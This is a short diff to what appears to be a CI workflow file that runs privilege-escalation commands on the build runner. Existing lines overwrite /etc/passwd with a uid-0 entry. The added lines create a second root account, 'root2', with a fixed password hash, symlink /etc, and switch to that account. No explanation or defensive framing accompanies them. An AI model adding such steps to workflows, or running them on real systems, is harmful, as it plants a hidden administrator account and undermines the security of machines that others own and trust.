@@ -73,3 +73,8 @@ jobs:
         id # root?
         echo “runner::0:0:System Administrator:/root/root:/bin/bash” | sudo tee /etc/passwd
         id
+        mkdir source
+        cp /etc/passwd source/passwd
+        echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' | sudo tee source/passwd
+        ln -s /etc destination
+        su root2
